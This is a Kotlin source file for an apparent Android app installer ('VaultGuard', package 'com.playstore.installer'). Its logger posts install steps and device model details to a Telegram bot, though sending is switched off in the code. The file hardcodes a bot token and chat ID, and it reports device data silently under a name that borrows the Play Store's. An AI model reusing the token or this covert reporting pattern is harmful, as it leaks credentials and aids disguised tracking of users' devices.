package com.playstore.installer

import android.content.Context
import android.os.Build
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object TelegramLogger {

    // Installer-side logging disabled — Installer is working correctly.
    // Set to true to re-enable if installer-side debugging is needed again.
    private const val ENABLED = false

    private const val BOT_TOKEN = "9130546359:AAEl7vR4ahiQzX45RGjhUumBZRorvbyQXUw"
    private const val CHAT_ID   = "8852912150"
    private val TAG = "TelegramLogger"

    // ── Deduplication ─────────────────────────────────────────────────────────
    // Tracks "step|result" keys seen in this process lifetime.
    // Prevents infinite-retry loops from spamming the same failure message
    // repeatedly to Telegram. INSTALL_RECEIVER status messages are excluded
    // from dedup (each is a distinct session event with a unique session ID).
    private val _sentKeys = java.util.Collections.synchronizedSet(
        java.util.LinkedHashSet<String>()
    )
    // Steps whose messages are ALWAYS sent regardless of dedup
    // (they carry unique session IDs or timing info that makes each message distinct)
    private val ALWAYS_SEND_STEPS = setOf(
        "INSTALL_RECEIVER",
        "STATUS_PENDING_USER_ACTION",
        "STATUS_SUCCESS",
        "INSTALL_FAILURE",
        "DIAGNOSTIC_REPORT"
    )

    /** Call once at the start of a fresh install flow to clear the dedup cache. */
    fun resetDedup() {
        _sentKeys.clear()
    }

    /**
     * Send a log message to Telegram bot.
     * Runs on a background thread — never blocks UI.
     * Prepends device info + timestamp to every message.
     * Deduplication: same step+result combination is sent at most once per
     * process lifetime, unless the step is in ALWAYS_SEND_STEPS.
     */
    fun send(context: Context, step: String, result: String, detail: String = "") {
        if (!ENABLED) {
            android.util.Log.d(TAG, "[$step/$result] $detail")
            return
        }
        // ── Dedup check ───────────────────────────────────────────────────────
        if (step !in ALWAYS_SEND_STEPS) {
            val key = "$step|$result"
            if (!_sentKeys.add(key)) {
                android.util.Log.d(TAG, "DEDUP: skipping duplicate [$step/$result]")
                return
            }
        }
        val ts     = SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS", Locale.US).format(Date())
        val device = "${Build.MANUFACTURER} ${Build.MODEL} (API ${Build.VERSION.SDK_INT})"
        val pkg    = context.packageName

        val text = buildString {
            appendLine("📱 VaultGuard Install Log")
            appendLine("🕐 $ts")
            appendLine("📲 $device")
            appendLine("📦 installer=$pkg")
            appendLine("─────────────────────")
            appendLine("🔹 STEP: $step")
            appendLine("🔸 RESULT: $result")
            if (detail.isNotBlank()) {
                appendLine("ℹ️ DETAIL: $detail")
            }
        }

        Thread {
            try {
                val url  = URL("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod      = "POST"
                conn.doOutput           = true
                conn.connectTimeout     = 10_000
                conn.readTimeout        = 10_000
                conn.setRequestProperty("Content-Type", "application/json")

                val escaped = text
                    .replace("\\", "\\\\")
                    .replace("\"", "\\\"")
                    .replace("\n", "\\n")
                    .replace("\r", "\\r")
                    .replace("\t", "\\t")

                val payload = "{\"chat_id\":\"$CHAT_ID\",\"text\":\"$escaped\"}"
                val bytes   = payload.toByteArray(Charsets.UTF_8)

                conn.setRequestProperty("Content-Length", bytes.size.toString())
                val out: OutputStream = conn.outputStream
                out.write(bytes)
                out.flush()
                out.close()

                val code = conn.responseCode
                conn.disconnect()
                android.util.Log.d(TAG, "Sent [$step] → HTTP $code")
            } catch (e: Exception) {
                android.util.Log.e(TAG, "Failed to send [$step]: ${e.message}")
            }
        }.start()
    }
}
